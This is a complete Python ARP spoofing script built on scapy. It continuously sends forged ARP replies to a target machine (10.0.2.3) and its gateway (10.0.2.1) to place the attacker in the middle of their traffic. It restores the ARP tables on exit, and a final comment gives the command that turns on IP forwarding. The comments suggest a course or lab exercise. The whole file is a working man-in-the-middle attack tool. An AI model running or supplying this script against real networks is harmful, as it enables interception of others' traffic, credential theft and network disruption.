#!/usr/bin/env python3
import scapy.all as scapy
import time
# import sys

scapy.ls(scapy.ARP) #in terminal
#pdst is the ip of the target computer
#hwdst mac of target
#psrc is ip of router
#op 2 is response, instead of request


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    # answered_list, unanswsered_list = scapy.srp(arp_request_broadcast, timeout=1)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #tells it to return only 1st item returned which is the answered list
    # print(answered_list.summary())
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.3"
gateway_ip = "10.0.2.1"

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
        #sys.stdout.flush() #for python2
        time.sleep(2)
except KeyboardInterrupt:
    print("\r[+] Detected CTRL + C ..... Resetting ARP tables, please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# terminal will require > echo 1 > /proc/sys/net/ipv4/ip_forward